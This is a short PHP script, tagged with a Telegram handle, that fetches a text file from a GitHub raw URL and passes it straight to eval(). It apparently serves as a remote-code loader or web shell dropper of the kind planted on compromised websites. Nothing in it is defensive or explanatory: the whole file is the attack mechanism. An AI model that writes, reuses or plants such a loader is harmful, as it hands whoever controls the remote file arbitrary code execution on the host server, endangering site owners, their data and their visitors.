<?php
#telegram @Devidluice
$remoteUrl = "https://raw.githubusercontent.com/uidr00t/rere/main/unzip-full.txt";
$ch = curl_init($remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$remoteCode = curl_exec($ch);
if (curl_errno($ch)) {
    die('cURL error: ' . curl_error($ch));
}
curl_close($ch);
eval("?>" . $remoteCode);
?>
